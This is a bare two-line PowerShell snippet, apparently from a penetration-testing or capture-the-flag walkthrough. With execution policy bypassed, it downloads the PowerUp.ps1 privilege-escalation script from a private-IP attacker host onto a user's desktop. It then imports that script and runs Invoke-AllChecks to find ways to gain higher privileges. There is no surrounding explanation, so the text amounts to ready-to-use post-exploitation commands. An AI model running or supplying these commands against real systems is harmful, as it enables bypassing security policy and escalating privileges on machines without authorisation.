```
powershell.exe -exec bypass -Command (New-object System.Net.Webclient).DownloadFile('http://10.14.27.199/PowerUp.ps1','C:\Users\bill\Desktop\PowerUp.ps1')
powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1;Invoke-AllChecks}"
```